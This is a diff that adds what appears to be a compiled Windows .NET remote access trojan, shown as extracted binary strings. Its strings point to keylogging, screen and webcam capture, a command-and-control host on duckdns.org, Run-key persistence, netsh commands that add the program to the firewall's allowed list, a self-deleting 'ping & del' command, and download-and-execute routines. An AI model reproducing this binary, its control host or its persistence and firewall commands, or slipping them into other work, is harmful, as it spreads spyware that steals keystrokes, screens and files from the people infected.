@@ -1,0 +1,106 @@
+!This program cannot be run in DOS mode.
+$PEL
+ H.text
+ `.rsrc
+X@@.reloc
+@B`tH
+		o0
+3)rk
+3ys	
+1ws	
+1Ms	
+3us	
+j3wr%
+32	(
+3 r]
+.{	 
+.s	 
+.f	 
+.Y	 
+.Q	 
+.I	 
+p.<	
+q.7	
+r.2	
+s.-	
+t.(	
+u.#	
+*BSJB
+v2.0.50727
+#Stringsl
+#US#
+#GUID
+#Blob
+j!H(
+:#<)
+:%p+
+:%|.
+:*dF
+<Module>System.Runtime.CompilerServicesCompilationRelaxationsAttribute.ctorRuntimeCompatibilityAttributeSystemObjectMicrosoft.VisualBasic.CompilerServicesStandardModuleAttributeSystem.IOFileInfoFileStreamMicrosoft.VisualBasic.DevicesComputerSystem.Net.SocketsTcpClientMemoryStreamConversionsToBooleanSystem.ReflectionAssemblyGetEntryAssemblyget_LocationByteExceptionMicrosoft.VisualBasic.MyServicesRegistryProxyServerComputerget_RegistryMicrosoft.Win32RegistryKeyget_CurrentUserStringConcatOpenSubKeyDeleteValueProjectDataSetProjectErrorClearProjectErrorRuntimeHelpersGetObjectValueGetValueRegistryValueKindCreateSubKeySetValueDateTimeOperatorsConditionalCompareObjectEqualToStringEnvironmentget_MachineNameget_UserNameFileSystemInfoget_LastWriteTimeget_DateComputerInfoget_Infoget_OSFullNameReplaceOperatingSystemget_OSVersionget_ServicePackMicrosoft.VisualBasicStringsCompareMethodSplitSpecialFolderGetFolderPathContainsRegistryKeyPermissionCheckGetValueNamesget_LengthConvertToBase64StringFromBase64StringSystem.TextEncodingget_UTF8GetBytesGetStringSystem.IO.CompressionGZipStreamStreamCompressionModeset_PositionReadBitConverterToInt32DisposeSpaceIntPtrZeroop_Equalityop_ExplicitInteractionEnvironConversionHexModuleTypeLoadGetModulesGetTypesget_FullNameEndsWithget_AssemblyCreateInstanceDirectoryInfoget_NameToLowerCompareStringget_Directoryget_Parentget_LocalMachineAppWinStyleShellFileDeleteDeleteSubKeyEndAppSystem.ThreadingThreadSleepExistsFileModeReadAllBytesWriteFlushCloseSystem.DiagnosticsProcessStartEnvironmentVariableTargetSetEnvironmentVariableCopySystem.NetWebClientSystem.DrawingGraphicsBitmapRectangleSizeConcatenateObjectget_CharsToArrayDownloadDataPathGetTempFileNameWriteAllBytesget_MessageNewLateBindingLateSetLateCallBooleanLateGetCompareObjectEqualOrObjectSystem.Windows.FormsScreenget_PrimaryScreenget_Boundsget_Widthget_HeightSystem.Drawing.ImagingPixelFormatImageFromImageCopyPixelOperationCopyFromScreenCursorCursorsget_DefaultPointget_PositionDrawToIntegerDrawImageImageFormatget_JpegSaveWriteByteRuntimeTypeHandleGetTypeFromHandleChangeTypeSystem.Security.CryptographyMD5CryptoServiceProviderHashAlgorithmComputeHashGetCurrentProcessget_HandleMonitorEnterInt32Socketget_ClientSocketFlagsSendExitset_ReceiveBufferSizeset_SendBufferSizeset_SendTimeoutset_ReceiveTimeoutConnectget_AvailableSelectModePollNetworkStreamGetStreamReadByteToLongChrWCharReceiveParameterizedThreadStartJoinCommandMutexThreadStartSessionEndingEventArgsSessionEndingEventHandlerSystemEventsadd_SessionEndingApplicationDoEventsset_MinWorkingSetConditionalCompareObjectNotEqualCompilerGeneratedAttributeDebuggerStepThroughAttributeSTAThreadAttributeKeysStringBuilderGetProcessByIdget_MainWindowTitleDateAndTimeget_Nowget_ProcessNameEnumKeyboardget_Keyboardget_ShiftKeyDownget_CapsLockToUpperget_CtrlKeyDownRemovej.exeavicap32.dllkernel32user32.dlluser32ntdllmscorlibOKjklAVNVRMTEXEDRRGHPYBDIdrIsFIsuLOFSFkqCnsfCMeMblastcapPLG.cctorNtSetInformationProcesshProcessprocessInformationClassprocessInformationprocessInformationLengthcapGetDriverDescriptionAwDriverlpszNamecbNamelpszVercbVerGetVolumeInformationGetVolumeInformationAlpRootPathNamelpVolumeNameBuffernVolumeNameSizelpVolumeSerialNumberlpMaximumComponentLengthlpFileSystemFlagslpFileSystemNameBuffernFileSystemNameSizeGetForegroundWindowGetWindowTextGetWindowTextAhWndWinTitleMaxLengthGetWindowTextLengthGetWindowTextLengthAhwndDLVnGTVretSTVttypinfENBsDEBSBSBSBZIPCamACTHWDPlugincEDCompDirF1F2UNSINSIndmd5priSendbconnectRCko_Lambda$__1a0_Lambda$__2a1LastAVLastASlastKeyLogsvnToUnicodeExadefgGetKeyboardStateMapVirtualKeyGetWindowThreadProcessIdGetKeyboardLayoutGetAsyncKeyStateAVVKCodeToUnicodeFixkWRKmain
+emViaQ==	0.7d
+video.exe
+AppDataA19467bbaff399bfab98c9b8050376c7b'zebircp.duckdns.org
+|'|'|
+	True[Software\Microsoft\Windows\CurrentVersion\Run
+Software\
+yy-MM-dd
+??-??-??
+Microsoft
+Windows
+ 	 Win
+x86	 x64	 x86
+SystemDrive
+.Mnetsh firewall delete allowedprogram "
+"	.exe
+Software=cmd.exe /c ping 0 -n 2 & del "
++SEE_MASK_NOZONECHECKS
+1Gnetsh firewall add allowedprogram "
+" ENABLE	" ..
+kl	prof
+getvalue
+Execute ERROR
+Download ERROR
+Executed As 
+Execute ERROR 
+start
+Update ERROR
+Updating To 
+Update ERROR 
+clear
+act	[kl]
+yy/MM/dd 
+[ENTER]
+[TAP]
+WrapNonExceptionThrows
+5Xtnt `t_CorExeMainmscoree.dll
+IHDR
+PLTE
+tRNS
+h&'i
+>@k)
+	pHYs
+IDATx
+2{oW
+~!Qk
+zU,@
+`6||
+X<U;|.
+^6*+
+0{S#
+6?%tEXtdate:create2015-04-14T20:38:16-05:00
+%tEXtdate:modify2015-04-14T20:38:16-05:00
+^FIEND
+PAD(0`
+%4  
+6@@(B7PA<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+  <assemblyIdentity version="1.0.0.0" name="MyApplication.app"/>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
+    <security>
+      <requestedPrivileges xmlns="urn:schemas-microsoft-com:asm.v3">
+        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>
+PPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADp
